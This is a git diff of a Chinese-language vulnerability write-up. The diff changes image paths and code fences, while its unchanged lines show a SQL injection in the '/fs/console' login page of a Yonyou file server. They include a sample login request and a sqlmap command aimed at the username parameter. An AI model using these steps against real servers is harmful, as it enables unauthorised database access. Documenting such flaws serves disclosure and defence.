@@ -20,19 +20,19 @@
 
 登录页面如下
 
-![yongyou-6-1](images/yongyou-6-1.png)
+![yongyou-6-1](../.gitbook/assets/yongyou-6-1.png)
 
 在应用中存在文件服务器管理登录页面
 
-```plain
+```
 http://xxx.xxx.xxx.xxx/fs/
 ```
 
-![yongyou6-2](images/yongyou6-2.png)
+![yongyou6-2](../.gitbook/assets/yongyou6-2.png)
 
 登录请求包如下
 
-```plain
+```
 GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 Upgrade-Insecure-Requests: 1
@@ -46,8 +46,8 @@ Connection: close
 
 使用Sqlmap对**username参数** 进行SQL注入
 
-```plain
+```
 sqlmap -r sql.txt -p username
 ```
 
-![yongyou-6-3](images/yongyou-6-3.png)
+![yongyou-6-3](../.gitbook/assets/yongyou-6-3.png)
